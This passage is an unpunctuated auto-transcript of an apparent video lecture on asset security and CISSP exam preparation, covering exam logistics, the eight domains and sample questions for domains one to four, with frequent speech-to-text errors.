fine until the organization faced a
Cyber attack the hacker hacked all the
servers in Tim's organization the
organization had loads of data not all
of the data had the same level of
protection the level of protection
varied from one piece of information to
another in this scenario the hacker
could hack into only that particular
data which was less protected however
this Cyber attack had a huge impact on
the organization in addition to this it
was also discovered that there was some
flow in the information classification
process that exposed even sensitive data
to a Cyber attack in other words even
crucial data was left with very less
protection this gave rise to asset
security asset security is defined as
the process of collecting and protecting
assets such as data and devices asset
security helps an organization
understand and classify data with
respect to its importance which in turn
makes sure that highly valuable data
receives the most protection asset
security achieves its goals through its
domains the domains are information
classification then we have data
classification data life cycle data
remnants and finally we have data loss
prevention each of these domains have
different goals all of these domains
together make up asset security now
let's have a look at each of these
domains individually first up we have
information classification as you saw
what happened in Tim's organization it
is understood that importance of data
varies largely we have to classify Data
before we can move on to protecting it
we need to be able to identify which is
the most crucial data with respect to
organizations information classification
is defined as a process of segregating
data based on its importance to provide
adequate level of protection to every
piece of data information classification
is different for each sector based on
their objectives the classification
varies in the general sector information
classification is used to minimize risks
on crucial information whereas in the
government or military sector it is used
to prevent unauthorized taxes and
finally in the commercial sector it is
used to keep sensitive information
private here it is seen to it that
information is not disclosed to a
company's competitors let's now move on
to our second domain that is data
classification as the name suggests here
data is basically classified based on a
set of considerations here we will look
into the factors like data retention
requirements then data security
requirements data disposal methods data
encryption requirements and finally
compliance requirements so these are the
factors which are taken into
consideration while class classification
before classifying data an important
step is to understand the data life
cycle all of us speak of data all the
time we cannot derive any information
from it hence this step is very crucial
in the third phase data is viewed or
used in some application or processed in
addition to data being viewed and
processed it is also shared between
various users and Custom our fifth faces
archive here data which is not used
frequently that is inactive data is
identified and then moved into long-term
storage systems and finally we have the
destroy phase as the name suggests data
is simply destroyed here data can be
destroyed either digitally or physically
not to forget you cannot simply destroy
data it should be done based on
regulations but have you wondered what
happens if data is not destroyed even
after we try our best to erase it well
this gives rise to data remnants in
simple words data remnants is a term
used for the residual of Digital Data
which remains even after attempting to
erase that particular data data remnants
should be avoided as it is not good to
have remains of a piece of data which
was intended to be destroyed Security
Professionals should be well versed with
techniques to avoid data remnants so how
do we tackle data remnants for this we
have various methods thoughts they are
purging clearing overwriting degaussing
storing and finally destruction let's
have a look at each of these methods
individually and understand how they
help in tackling data remnants first up
we have purging purging is done to
minimize risks on crucial information in
clearing data from storage devices are
removed however it can be reconstructed
by using various softwares third we have
overwriting here we write over the
original data several times so that the
original data cannot be recovered
decausing is the method used to destroy
data on magnetic storage tapes next up
we have storing before storing data on
media the data is encrypted for the
purpose of safety finally the sixth
method is destruction here storage
device which hold the data are
physically damaged incineration crushing
and shredding a few of the methods used
for destruction now let's move on to our
fifth domain data loss prevention in
this domain various security measures
are adopted that will help in making
data available to only the authorized
users here we will look into four of
such measures the first measure is data
inventory in this step data is
identified and then classified in the
Second Step the data flow is plotted
over the life cycle the third measure is
data protection strategy here a number
of risk assessments are performed the
fourth measure is implementation in this
step we take up cases which have had a
history of data loss for testing purpose
those were the five domains under asset
Security in addition to these it is also
required that we understand the term
privacy with respect to asset security
privacy is a very crucial aspect when it
comes to asset security information
privacy and data privacy are more or
less the same this term is used to
differentiate one person from another it
relates to the personal data stored on
computers so what kind of data falls
under this category well we have data
such as Medical Records Office data
financial data Etc which fall under this
category to uphold privacy we use
Technologies like pseudonymization
tokenization and anonymization well
pseudonymization refers to a data
management process anonymization refers
to a process of either encrypting or
removing personally identifiable data so
that people who the data describes
remain anonymous and finally in
tokenization a sensitive piece of data
is substituted with a non-sensitive
equivalent cisp stands for the certified
information security or rather certified
information system security professional
it is considered as a gold standard in
the field of information security it is
a management certification so when you
are in the Senior Management this is the
kind of certifications that you would
require wire for your management skills
now this is a non-technical or a
semi-technical certification here it's
nothing about vulnerability assessment
or penetration testing you're not going
to do anything Hands-On you are not
expected to know hacking or you are not
expected to know how to configure
firewalls antiviruses and whatnot it's
basically something that over a period
of years of experience you have evolved
a certain understanding of how security
policies should be constructed how they
should be implemented and how security
affects an organization so here you are
responsible to create a overall security
policy for an organization to help
maintain the security posture of an
organization now as far as the
certification is concerned it has a
validity of three years after which you
don't have to keep the exam again
however during these three years you
have to earn a certain point so it is
known as a continuing education points
that IC Square allows you to generate
points by attending lectures or by
attending webinars by publishing white
papers by providing trainings obviously
all of these should be authorized and
you should have a validation from
authorized party that you have done this
activity once it is verified you will be
awarded certain points once you have
collected sufficient number of points
you will retain your certification
beyond the three years the passing rate
of this exam is less than 50 percent so
it's not how much you require to score
what this basically tells you is the
amount of people who actually clear the
exam in the first attempt now let's not
get disheartened because of this
essentially the exam is quite tough it's
known as a mild wide an inch deep exam
that means you need to know just about
everything and anything that is there to
be known in information security and
that's something that we are going to
discuss when we go into the eight
domains of cissp what happens is there
are a lot of people who are not actually
prepared for the exam who think they are
prepared attempt the exam and set fully
fail in their first attempts some people
just misjudged the exam and not prepared
for it so the fact that I'm trying to
put across is be very well prepared I
have seen people who study for months
together attempt a lot of questions
ensure that their knowledge is up to the
mark and only then do they attempt the
exam anybody can register for the exam
to be honest and clear the exam as well
however to get certified there are two
different Avenues so if you have a
experience of at least five years in two
of the domains that are in the cisp
course you get certified so even if you
clear the exam there is a validation
process that happens after the exam
where you have to submit documentation
to prove to IC square that you have that
level of experience and once it is pro
proven and validated you get certified
as a cissp if you do not have that five
years of experience you get certified as
an associate of ISE Square for cisp and
they give you six years during which you
can achieve the level of experience
prove it to them and then get certified
as a cissp so you can see the stringent
levels that are taken for this
certification the validation is
basically documentation and proof that
you have to submit and which is verified
so even after you clear an exam to get
validated and get certified it can take
up to five to six weeks for ISC Square
to validate and provide you with the
certification with that let's go and see
the exam let's have an overview of what
the exam is all about the governing
bodies ISE Square that's what we have
been referring to and the professional
experience at least four years of
college degree or additional credentials
from ISC Square's approved list that
will satisfy one year of required
experience and five years of paid
full-time work experience in two or more
domains like I said anybody can give the
exam register for it attempt it once you
clear then that's where the criteria of
your work experience comes into the
picture you prove five years of
experience probably by a letter from
your organization from your HR saying
you you have this kind of experience
that is relevant to the certification
Isis were validate it you get the
certification if you don't have that
experience you get associate of IC
square and then you get six years to
attain that level of experience after
which you can get certified the exam
fees
699 dollars so it's an expensive exam a
single attempt for each voucher so if
you fail that's another 700 for the
second attempt the fact being if you
fail for the first time you cannot
attempt the exam for the next 30 days if
you fail for the second time you cannot
attempt the exam again for the next 60
days and if you fail for the third time
you cannot attempt the exam for another
19 days so there's a cooling off period
after each attempt so I would suggest
study hard go for the first attempt
clear it and nail it the maintenance
fees for your certification is again 85
US dollars for three years the exam
length is three hours and the questions
could vary from 100 to 150 150 being the
Max questions that can be asked in that
exam you can clear the exam well before
150 questions so be prepared for that as
well but imagine when you're walking
into that exam bear in mind that you
will be asked 150 questions and you have
to time those in three hours 180 minutes
that's what three hours is so if you do
the math not much time for every
question so it's just a minute and a
half or less than that for each question
and the questions could be very
descriptive could be confusing so you
have to have your mental faculties
really strong during the exam the
passing score is 700 out of a possible
1000 points exam language is English
testing centers there are ISC Square
authorized centers where you need to
book that exam there's a huge process
that you have to follow to where you go
for the exam itself so once you have
registered on the IC Square portal and
you purchase the voucher they will give
you a list of centers in your vicinity
that you can look into they'll give you
a calendar to give you the possible
dates that you can attempt the exam on
select the center select the date reach
the center at least half an hour before
the scheduled time there is a
verification so you have to carry your
identification a government issued
document either a passport driver's
license where you have to prove that you
are who you say you are and once the
verification is done only then do you
get to attempt the exam the question
formats are three types multiple choice
drag and drop and hotspots multiple
choice is the format that you are going
to look at when we look at sample
questions it's the same they give you a
question they give you four options
either one or more options need to be
chosen they will specify if there is
more than one answer to that particular
question in a drag and drop it's most
like more like match the following so
there will be a column A and column B
and they'll ask you a question and say
okay column A gives you the options drag
and drop whichever correct answer is in
call is from column A to column B and
then submit the answer if the answer is
correct you get awarded the points else
there is no negative marking the third
is a hot spot a hotspot question is
basically a diagram let's say a
architectural diagram that will be
presented to you and they will ask you
to pinpoint a certain aspect within that
diagram for example they may give you an
architectural overview of a network of
how it has been established and they
will ask you for a network based
firewall which is the most likeliest
area that you want the firewall to be
placed in so you don't need to know how
to configure the firewall but from an
architectural perspective you need to
know where that firewall needs to be
placed for it to be the most effective
for the given scenario in the question
these are the domains that are asked so
you can see it basically covers anything
and everything that is there in
information security it starts off with
security and risk management which
weighs 15 percent in your questions in
your exam so if your exam is 115
questions 15 would be around around 20
22 odd questions and risk management
being one of the most important topics
for these kind of certificate
applications then asset security which
covers 10 percent of your questions so
that's around 15 questions security
architecture and engineering this is
where your infrastructural knowledge uh
your security architecture your
Enterprise architecture all those come
into the picture there are a lot of
theoretical models that you need to
study in domain three and that covers 13
of your exam Communications and network
security this is the most technical
topic within all these eight topics this
is where you talk about networks you
talk about TCP you discuss protocols
like TCP UDP you discuss different
attacks man in the middle attacks toss
attacks and this basically has 14 of
weightage then you have identity and
access management which basically talks
about users subjects objects subject
being the user object being the resource
and a relationship between these to be
created where people are authorized for
some activity authenticated and only
then allowed and also held accountable
for whatever activity they have done
then you go going to security assessment
and testing so vulnerability assessments
penetration tests software test testing
SAS tasks a little bit all those will be
covered in domain number six which has
12 percent weightage then security
operations so Security operation Center
or the stock day-to-day management of
incidents so your Incident Management
would come into the picture problem
management change management all of
those things would come under domain
seven and security operations which has
13 of weightage and then finally
software development security now you
don't need to know development or you
don't need to know any programming there
are no program based questions they are
not going to ask you how to code they're
going to ask you how to manage a
software development life cycle or a
secure software development life cycle
so this is where your waterfall models
modified waterfall models spiral agile
devops devsecops all come into the
picture and this has 10 percent of
weightage now it is near about
impossible for everyone or anyone to get
experience across all these domains so
you have your strong points and you will
have your weak points the task is to
identify where you are good at
understand those things make the maximum
amount of it then identify your weak
points and start developing on those if
you are able to look at it from a
theoretical perspective however if you
can get an internship or if you can get
uh you can say just an Insight of how it
works in the Practical world it would be
very helpful now that being said as far
as cissp exam is concerned it involves a
very Ideal World the real world actually
doesn't come into the question because
the real world will have a lot of
business logic to it by business logic
what do we mean every organization will
modify their projects based on the
expertise that they have based on the
talent that they have and based on the
people uh or the hierarchy of the
organization that has been established
so it can be customized to each and
every organization since an exam cannot
deal with these kind of customizations
we deal with an Ideal World so for the
cisp exam we assume that we have all the
resources we have all the people that
are required we have an hierarchy in the
training which is given out where we
have rules for each and every person and
job titles for each and every person
right so when we go through the training
it is very essential that we understand
what these job rules are what their
responsibilities are so that when we get
those questions we can identify which
person is going to attempt what in the
real world things are very different we
piggyback we take on multiple
responsibilities and that is something
that cisp doesn't adhere to so you have
to be very careful identify the job
roles identify the responsibilities have
that map the hierarchical map created
very well and then try to implement the
ideal World scenario from the cisp
standards to see what is going to happen
that being said let's move on let's
discuss the domains now these domains
we've already seen what we can do is we
are going to move on to the sample
questions for each and every domain once
we reach the domain we'll see what the
topics in that domain are we will look
at the sample questions then we will
look and go to the next domain see the
topics in that domain and then look at
the sample questions as well so what to
study and those sample questions
revolving them so looking at the first
module or first domain security and risk
management now this is one of the
largest domains that could be debatable
for me I would say the largest domain
could be domain number three security
architecture and engineering could also
be domain number four because it is
quite technical Communications and
network security and could also be
security operations because that's
Incident Management change management
problem management all together but each
domain is very important from the exams
perspective if you're thinking about
keeping a domain for options forget it
that's not the right way to address the
exam let's start off with the first one
security and risk management this domain
teaches you all about Information
Systems management and this talks about
risks and everything so what we're going
to do is we are just going to go to the
official document from IC Square where
these domains and their topics are given
so that's the exam outline from CIS from
IC Square towards cisp this is the
latest document that is there available
online you can see the URL in my browser
address bar and these are the eight
domains this is the exam three hours
number of questions 100 to 150 multiple
choice and advanced Innovative questions
that's where the drag and drop and the
hotspot comes into the picture though
based on experience I can tell you that
90 percent of your questions will be
multiple choice 10 would either be drag
and drop and hotspots passing grade is
700 out of a thousand points exam
language availability is English those
who want to attempt in other languages
it is available but then the exam is six
hours and the questions are 215. so
that's your option depending on which
language you're most comfortable with we
are going to go with English that's the
language options coming cisp linear exam
6 hours 250 questions everything else
Remains the Same these are the languages
supported French German Brazilian
Portuguese Spanish Japanese simplified
Chinese and Korean the weightage I guess
Remains the Same and that's the first
domain security and risk management so
what does it pertain to understand and
apply concepts of CIA confidentiality
integrity and availability in the first
video we have gone through all the eight
domains at quite some length we have
discussed what CIA is all about and how
the interrelationship is so if you want
a deep dive or rather a deeper time than
what we are doing for their domains go
back to the first video uh look into
that and then you can come back to this
video again so evaluate and apply
security governance principles so we
have to understand what governance is
now governance is basically having a
overlying architectural security policy
that can be integrated with an
Enterprise architecture and thus having
your security policy in alignment with
the business goals and objectives
security should never become a hindrance
for a business security should always
become a supporting feature which should
allow the business to be executed in a
secure manner so as a security expert
our first goal is to identify what the
business does what the business
processes are what is the business
trying to achieve and then we try to
create a security policy revolving these
to enhance the business functionality in
a overall picture so you're looking at
organizational processes Acquisitions
diverse teachers acquisition is when
let's say scenarios where you are trying
to create a security governance policy
now the business is trying to change
because they're trying to acquire
another organization and merge it within
this organization and now your security
policy should then come past not only
your organization but the newly acquired
organization let's say in the next five
years a business the size that the newly
acquired organization is no longer
profitable and they want to sell it off
and now that's where the dive Asia comes
into the picture you are now trying to
separate the entity that you have just
integrated in your security policy and
you are now trying to separate it with
confidentiality integrity and
availability of the company's data
intact without affecting the
organization at any point in time
understand the fact that security is not
only about hacking or getting hacked
it's about being secure at all points in
time during business continuity and
business let's say business as usual
kind of activities so that's where your
security control Frameworks would come
in you're going to talk about ISO 27001
we are going to talk about cobit PCI DSS
nist 800 series and so on so forth and
the most two important statements or
terms in the cisps due care and due
diligence do you care is you doing your
own research to identify what security
controls need to be implemented or what
kind of governance needs to be
implemented and due diligence is you
yourself spending that much time money
effort into implementing those decisions
that you have come up come across during
the due care thus enhancing the security
functions of an organization so when we
talk about business requirements for a
business to be effective at the same
time it needs to be legal it needs to be
compliant to regulations and laws and to
the contracts that have been created by
the organization so as far as the
concept goes when we say that security
needs to be in alignment with the
business requirements the business
requirements imply that the business is
legal is compliant to regulations is
compliant to their contractual
obligations and is following standards
that have been prescribed to them so all
of them come together and that's where
your security mapping comes into the
picture you're looking at legal and
Regulatory issues like cyber crimes and
data breaches licensing and intellectual
property requirements and so on so forth
and it will also include ISC Square's
code of professional ethics now this is
a document apart from the eight domains
that we have talked about thus what does
this this document talk about this is
the prescription from IC square of
professional ethics for a cyber security
professional expect around four to five
questions from professional ethics as
well so not only is this a document that
you need to read and adhere to you will
be questioned upon this in your exam and
these are easy points to score
professional ethics something that is
ethical something that is not against
the law so it's kind of quite easy but
the questions can be confusing so you
need to go through the entire document
really well and then your organization
will have its own code of ethics however
if you look at the hierarchy IC squares
ethics comes first so your
organizational ethics should not be
contradictory to IC squares Ethics in
the first place then develop document
and Implement security policy standards
procedures and guidelines identify
analyze and prioritize business
continuity requirements so here that's
where your risk assessment comes into
the picture if you're looking at a
particular risk that means a particular
vulnerability has been identified you
want to see the likelihood of that
vulnerability being exploited and then
the business this impact analysis that
it may have based on which you would
then create a plan to mitigate that
particular risk by having a business
continuity or a disaster recovery plan
coming into the picture now this is as
far as this domain is concerned you're
calculating the risk it doesn't actually
tell you how to mitigate that risk
that's when you go into the next future
domains and discuss those technicalities
so you can see a contribute and enforce
Personnel security policies now the
thing about cisp is physical security
also comes into the picture why because
if uh Hardware is not well protected
there would be physical attacks social
engineering attacks that could be
created which would lead to a data
leakage as well and the first and the
foremost most valuable asset of an
organization is always human Personnel
so cissp would also deal with people
protection in the first place for
example protecting people against social
engineering attacks making them aware
about these attacks if there are natural
calamities you have to plan a plan and
for them during your disaster recovery
and business continuity plan and ensure
that people are safeguarded not only
that you have to tie these things up
with identity and access management for
example account creation account
management onboarding of employees
off-boarding termination of employees
third-party contractors Consultants that
you're going to hire which are not
employees but third parties coming in to
your organization providing intelligence
and so on so forth so all of those come
into this picture as well and then
that's where your rescue management
Concepts come in it gives you a very
good overview of how to identify those
risks and so on so forth now this is
what the in the first domain is all
about it itself is very huge and as we
go ahead we can tie this domain to the
rest of the domains for more deeper
analysis go to the first video and then
we can come back to this so let's start
with the questions the first question
now these are very short one-liner
questions your exams would be more
descriptive to be very honest with you
if you go online no matter what practice
questions are you try or whatever dumps
if you can find those you will find none
of them will be ever any close to the
actual exam questions you will find a
lot of sites online that sell you cisp
dumps with 100 guarantee for you to
clear don't fall for that it's just a
money making scam those questions will
be similar questions something that will
give you an Insight of what the exam is
going to be but when you attempt the
exam you will find out that those
questions are very different from the
actual exam itself coming back to the
question is the primary goal of security
awareness program is now what is a
security awareness program and why is it
created the primary goal so is it to
provide a platform for disclosing
exposure and risk analysis to make
everyone aware of potential risk and
exposure to provide accurate risk and
exposure results a way of communicating
security procedures now the answer to
this is to make everyone aware of
potential risk and exposure doesn't mean
that you are trying to make everybody
ethical hacker what you're trying to do
is in your organization you are trying
to create a security awareness program
which allows your employees to know what
kind of policies exist in your company
what rules need to be followed What are
the procedures that need to be followed
for them to safeguard themselves and
Company assets as well and ensure that
data leakage and data loss are kept at a
minimum so you're basically trying to
make everyone aware of the risks that
they may have for example social
engineering uh not clicking on links not
going to unwanted sites and so on so
forth question two a contingency plan
should address which of the following
potential risks residual risks or
identifiers now what is a potential risk
a potential risk is something that you
may foresee in the future something that
may exist a residual risk will come to
that what is an identified risk a risk
that has been identified is known to the
organization and the organization is
aware of it so potential is something
that may come into the future identified
as something that exists right now a
residual risk on the other hand is a
risk that was identified earlier on
mitigated by but after mitigation there
is still amount of residual risk that
exists so these terminologies need to be
understood really well for let me give
you an example of a residual risk so
let's say there's a SQL and injection
flaw that has been identified in an
application and that's a now that's now
an identified risk now you've got two
options in front of you go through a
software development life cycle again
recode that part of the application to
mitigate the risk or else have a
security control like a firewall a web
application firewall watching at risk
now the ideal scenario would be that you
go through the development process again
but that is going to take time so you
put in a compensatory control uh that is
a web application firewall in the
meanwhile to mitigate that risk and then
have the recoding done and then later on
resolve the risk altogether so when we
put in the firewall to mitigate the risk
temporarily is the risk actually
addressed no there is still a
possibility of a SQL injection attack
happening but we just have it mitigated
to a certain extent because there is a
firewall watching it so that means that
there is still a residue risk a risk
that is remaining even after me
integrate implementing the security
protocol or the security control that is
what a residual risk is something that
remains even after I put in a security
control which can be taken care of later
on or can be accepted and just moved
upon so coming back to the question a
contingency plan should address which of
the following either a potential risk a
residual risk can identify risk or all
of the above and the current answer to
that is a residual risk what is a
contingency plan a contingency plan is I
still have a security control but
something may go wrong and for that I
want a secondary control to be in place
to ensure if that if the first control
fails the second control would still be
able to identify that and stop the
security incident happening so we are
looking at residual risks and then
having contingency plan to manage those
residual risks question three when the
cost of the counter measures outweigh
the cost of the risk the best way to
handle the risk is to reject the risk
transfer the risk accept the risk or
reduce the risk now there are four ways
a risk can be managed right accept the
risk avoid the risk transfer the risk or
mitigate the risk right rejecting the
risk is not an option but what is the
question cost of account the measure
outweighs the cost of the risk so what
is the cost of a risk the cost of a risk
is basically the impact that the
organization is going to face in a
monetary manner if the risk is realized
to mitigate that we have a counter
measure in place so if in the previous
example I've identified a SQL injection
attack and the countermeasure to that is
me implementing a security control a web
application firewall to mitigate that
risk however if somebody executes that
risk somebody does a SQL injection
attack the loss that I'm facing is only
a hundred dollars for incident and the
maximum incidence that can happen in a
year are 10 so 10 into 100 is one
thousand dollars per annum is what that
risk is going to cost me for me to
implement a web application firewall on
an annual level it is going to cost me
let's say fifteen thousand dollars in
licenses management salaries and all of
those things which means that I am
facing a loss of one thousand dollars
but I'm spending fifteen thousand
dollars to prevent that loss I rather
have the thousand dollar loss than spend
fifteen thousand dollars right so in
this scenario the cost of the counter
major is outweighing the cost of the
risk by fourteen thousand dollars so in
this scenario which is the best way I
would do it either reject the risk which
is never an option because you cannot
reject the risk transfer risk what is
transferring your risk transferring it
to a third party by purchasing Insurance
examples right so if I purchase
insurance saying if this uh if this gets
compromised it's the insurance company
is going to uh make the payments and
safeguarded or accept the risk or reduce
the risk so in this scenario accepting
the risk is basically accepting the risk
the way it is moving on because there is
nothing that you can do about the risk
and you're willing to accept the risk
rather than spend money on it and reduce
the risk is mitigating the risk by
implementing the firewall and spending
that money and then incurring those
losses so in the best answer out of this
is accepting the risk why can't I
transfer the risk because there is no
such Insurance where I can in the given
example where I can get that kind of an
insurance policy reducing the risk would
entail me spending that fifteen thousand
dollars to mitigate the thousand dollar
risk thus incurring a fourteen thousand
dollar loss which is against the
business logic a business needs to make
money not spend money and that's the
fourth option that's left that's
accepting the risk which means we are
not going to implement the firewall
because it is outgoing the cost of the
risk we are just willing to accept the
risk itself and move on that's the first
domain moving on to the second which is
asset security consists of topics about
physical requirements of information
security let's go back to the document
in hand so moving on to domain 2 asset
security we talk about assets assets
could be now okay let's get into the
definition of what an asset is asset
could be anything that has a monetary
value associated with it from the
organization's perspective it could be
data it could be virtual assist it could
be physical assets it could be anything
and everything it could be a license
right you purchase an operating system
the operating system comes with a
virtual license that installs on your
machine or or is associated with an
email address even that license has a
value does even that license will become
a set so the basic definition is
anything and everything that is owned by
the organization and has a monetary
value associated with it right thus
you're going to we talk about asset
classification as well asset
classification could be data within data
itself there would be subclassifications
like confidential data non-con
confidential data public data and so on
so forth physical assets virtual assets
networking assets anything and
everything that you can come across
would be classified here determine and
maintain information and asset ownership
so your asset management program comes
into the picture and when you say asset
ownership the organization owns the
assets as they are however roles and
responsibilities that you have created
in the organization will ensure that
some assets are virtually only by
somebody that means that they are
responsible for the well-being of that
asset so you have to identify who for
example HR now HR is a function Human
Resources but they also need I.T assets
for example a payroll which will
institute a payroll software a database
right a web application server if you
will and all of these assets are now
owned by the HR department so there are
hundreds of people in HR so who exactly
owns this that's where we identify the
owner of that particular asset saying
you are responsible for the well-being
of these assets you belong to this
department so normally the head of that
department would be the owner of those
assets and would determine what kind of
access controls what kind of Maintenance
management security mechanisms are
required then we talk about protection
privacy so data owners data processors
remnants collection limitations
determining ensuring appropriate asset
retention so let's say data right even
if I have data how long do I retain data
if you go into privacy acts of
organizations or of countries rather so
gdpr for European Union gdpr basically
states that you will only retain
personal identifiable information for as
long as the organization requires it the
moment you have no reason to have that
data with you you're going to delete
that data so which means automatically
says you're going to retain that data
till it makes business sense once you
figure out it doesn't it is not required
you are going to delete it in a secure
manner which is not recoverable to
unwanted parties so you have to
determine those asset retention periods
we have to understand what those
attention retention periods are so even
for your physical assets there will be a
life of the set that is associated with
it and once the life of that asset is
over even even if the asset is working
properly you have to discard data set
and you have to replace it you have to
do this with security in mind then the
security controls for all of these
things understanding data States data
States could mean three different
aspects daytime motion data at rest and
data in use how are you going to secure
data during all these three stages what
are you protection methods that you're
going to utilize then info establishing
information asset handling requirements
so that's what domain 2 is all about
let's look at the questions so the first
question in domain two which of the
following is responsible for setting
user clearances to computer-based
information is it operators data owners
security administrators or data
custodians understand the question who
is responsible for setting your user
clearances to computer-based information
and the correct answer to that is
security administrators they are
responsible for setting the user
clearances who are going to be
responsible for allowing the user
clearances that's going to be data
owners what is generally concerned with
personal security management controls
operational controls technical controls
are human resource controls now what is
personal security personal Securities
people-centric security you're looking
at people and you're ensuring that their
security comes into the picture
technical controls can be used for data
assets or physical assets like
information technology but technical
controls may not be that way relevant
for a human a firewall is not going to
help a new one any which ways management
controls are administrative controls
that means a policy that will help you
implement controls but for personal
security is the operational controls
that are going to be associated with it
which of the following factors
determines the frequency of information
security audits in any given environment
so the age-old question for you to
remain secure how often do you want to
conduct a security audit to verify your
vulnerabilities your penetration test to
verify your security controls are
working properly so would it be
dependent upon asset value the risk
based approach management discretion or
level of realized threats and here the
answer to that question is risk the
moment a risk is identified for example
at what various stages would a security
audit be triggered for an individual
asset as well and that can be tied down
to Incident Management change management
and problem management so if there is an
incident a security incident with a
database server where there has been an
attack on that server I probably want a
security audit done on that server to
identify vulnerabilities flaws and then
to mitigate those risks similarly if
there is a change that has been going on
in your organization you first want to
go into a risk assessment strategy and
then you want to look at security audits
based on the rest that you have
identified right so a security audit is
not only periodic based on compliances
or regulations but it also can be
integrated really well in your Incident
Management problem management and change
management scenarios that's domain
number two all right let's talk about
domain 3 security architecture and
engineering now this is where you tie up
security architecture and Enterprise
architecture if you look at the first
domain we have talked about risk
assessments we have talked about
confidentiality integrity and
availability and then we've moved on to
the second domain where we talked about
asset security so that's where we talked
about data of data classification asset
classification now it starts off with
the Enterprise level architecture so
something like progaf what is enterprise
level architecture it's basically data
center architect and a network architect
trying to create data flows deciding how
Communications are going to happen
between various devices they're going to
try to do Network segmentation for web
application servers database servers
look at network isolations network
access control lists and may even decide
how firewalls and where firewalls would
be required once that architecture is
created we need to secure that
architecture to ensure that whatever
data Communications are happening within
that framework they are secured in a
manner where all the risks that the
organization may be exposed to are
either managed mitigated accepted
transferred whatever the way it is right
so here you start off with physical
security you start up with trusted
platform modules so looking at the
outline this is where it starts off with
Implement and manage engineering
processes using secure design principles
so this domain will talk about using
togaf and then using a zacman framework
to enter with all the data owners all
the asset owners querying them about the
security of the assets the requirements
because it is not the security architect
who determines how secure the device
will be it is the asset owner who
determines the requirement of security
for example continuing with the HR
example that we were talking about
earlier if the HR department of head is
responsible for the database for the
payroll application it is that person
who would be determining the security
levels So based on the security
architecture let's say the zachman
framework we would create a
questionnaire that needs to be filled
out by the asset owner the HR department
of head and would be supplied to us the
security heads and then we would try to
create a security profile based on their
requirements so if the HR department
head comes back to me and says that they
require to be adhering to a particular
standard or they want X kind of security
it is us who will validate that require
government and it is us who will execute
it and protect that asset based on their
requirements so this is where your
server security architecture meets
Enterprise architecture by using various
Frameworks this domain will introduce
you to not only zachman framework it
will again take you to a trusted
platform module it will talk about itsec
TC SEC common criteria and so on so
forth so this is again a very extensive
module some people struggle with it
because it is a largely theoretical
module and some people would struggle
with the concept of how what is a
security architecture and an Enterprise
architecture it is very important to
understand the differences between them
for example togaf is an Enterprise
architecture where a data center
architect would deploy and streamline
those devices on which a layer of
security architecture such as ISO 27001
would be implemented to enhance the
security and ensure that the
infrastructure remains protected at all
point in time this module will also deal
with managing vulnerabilities
on assets applications web-based systems
mobile systems and embedded devices so
this is where your engineering comes
into the picture by this module we mean
when we are deploying infrastructure we
need to engineer it with security in
mind we need to architect in such a way
that security enhances the business
needs business requirements and they are
executed in a secure manner let's look
at a few questions based on domain three
question one when a computer uses more
than one CPU in parallel to execute
instructions it is known as
multi-processing multitasking
multi-threading or parallel running now
here we need to understand what is the
difference between multitasking
multi-freading multi-processing and
parallel running now it would be very
difficult to explain all these processes
in in this video so here we are talking
about executing instructions that's
multiprocessing multitasking is
performing multiple tasks at the same
time multi-threading is where processors
create their multiple threads to manage
certain functions here when we are
parallely executing instructions it is
known as multi-processor question two
who mediates all access relationships
between subjects and objects of a system
now what is a subject what is an object
and what are access relationships so
access relationships would be your
permissions that you have created now
what are permissions permissions would
be something that a person is authorized
to do so if you look at the CIA which we
discussed in the module one
confidentiality integrity and
availability how do we keep data
confidential by only allowing authorized
users access to that data what are
authorized users authorized users are
people serving people who have been
identified and are allowed access to
certain resources how do we do that by
having an identity and access management
platform in place which will be
discussed later in the next domain but
confidentiality will include I triple A
standards I AAA starts with
identification authentication
authorization and accountability
identification is identifying the person
who they are on authentication is
verifying that they are actually who
they claim to be authorization is where
the access relationships come into the
picture where we once we have
authenticated a user we are creating a
matrix which allows them access to
certain resources to a certain extent
some may have read-only access some may
have modify access some may have delete
access
Etc so in this scenario we are talking
about access relationships between
subjects and objects of a system and who
mediates that now when you say reference
kernel information flow model or
security Kernel of firewall in this
particular scenario for this particular
question based on the options that are
available we are talking about a rule
based access control system which means
that we have created rules of what is
allowed into a network and how what is
not allowed within the network this can
be controlled by using a firewall so
this can be controlled by using a
firewall question three which of the
following is not a Spam blocking
architecture now what is spam and how
are you going to block it it can be at
the client's say it can be on the email
server by way of identified spam filters
could be application based in this
scenario mail blocking service is
basically you creating a blacklist which
will block emails from certain addresses
or from certain things so this is not a
Spam blocking architecture it's
basically a blacklist where you're
blocking emails but spam blocking
architecture could either be at the
email server based could be at the
client side where they're using let's
say Microsoft Outlook Express
interpreted tools within it or could be
on an application where you have
configured rules over there moving on to
domain four now this is where the
technicalities come into the picture
communication and network security the
network security domain covers topics
focused on protecting the network of an
organization so Communications TCP
channels UDP channels the TCP so you
come across the OSI layer you map the
osla with the TCP layer and see how a
data fragment packet is created looking
at domain four we are talking about the
OSI layer open systems interconnection
compared to the TCP IP or the
transmission control protocol of an
Internet Protocol models you're talking
about Internet Protocol itself you're
talking about converge protocol software
defined networks wireless networks then
we're talking about securing Network
components so we talk about firewalls
types of firewalls and coin security
network access control devices and we
look at them over virtualized networks
wipe multimedia located talked about
talking about remote access data
Communications right so all of this is
concerned within domain four now OSI and
TCP itself could take hours for people
to understand for people to comprehend
how computers work now these are
theoretical models and we need to create
an understanding of how Theory merges
with the Practical world let's look at a
few questions what is the purpose of
using a VPN now the sense over here is
what is a VPN or a virtual private
Network how is it created what
technologies can be utilized within it
what encryption mechanisms can be
utilized and why are we creating that
encryption mechanism in the first place
so is it to secure remote access into a
network securely connect two networks
together secure data tunnel within the
network or all of the above so here with
a VPN we are basically trying to do
everything we are trying to create
encrypted tunnel between two systems or
two networks where data can be
transmitted in a secure manner where man
in the middle attacks or network based
attacks would be mitigated a VPN can
secure packets from data link layer
onwards to the application layer
question two which of the following
characteristics are not included in the
TCP protocol now what is a TCP protocol
TCP is a connection oriented protocol it
is a reliable protocol that is utilized
to communicate between servers in a
reliable manner so a TCP protocol being
a connection oriented protocol which is
reliable in nature so which of the
following characteristics are not
included connection less protocol that
is the UDP protocol so this is not
included in the protocol question three
which if you remember the previous slide
would be the UDP protocol a UDP protocol
is a protocol that is used for its speed
rather than reliability when it is
real-time processing that is required to
use UDP so most of our voiped
Communications would happen over UDP
protocols okay so looking at domain
number five domain five talks about
identity and access management so this
ties up with your asset management your
risk management because if we go back to
the confidentiality Integrity in
availability aspect of it identity and
access management is basically a loving
authorized users access to Resources by
authenticating them and also holding
them accountable so this becomes the
